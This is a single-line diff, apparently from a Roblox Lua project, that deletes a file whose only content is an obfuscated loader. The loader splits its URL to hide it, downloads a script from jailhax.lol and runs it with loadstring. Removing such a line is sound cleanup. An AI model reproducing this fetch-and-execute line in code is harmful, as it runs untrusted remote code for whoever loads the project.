@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("ht" .. "tps://jailhax.lol/scripts/Utils.lua"))()
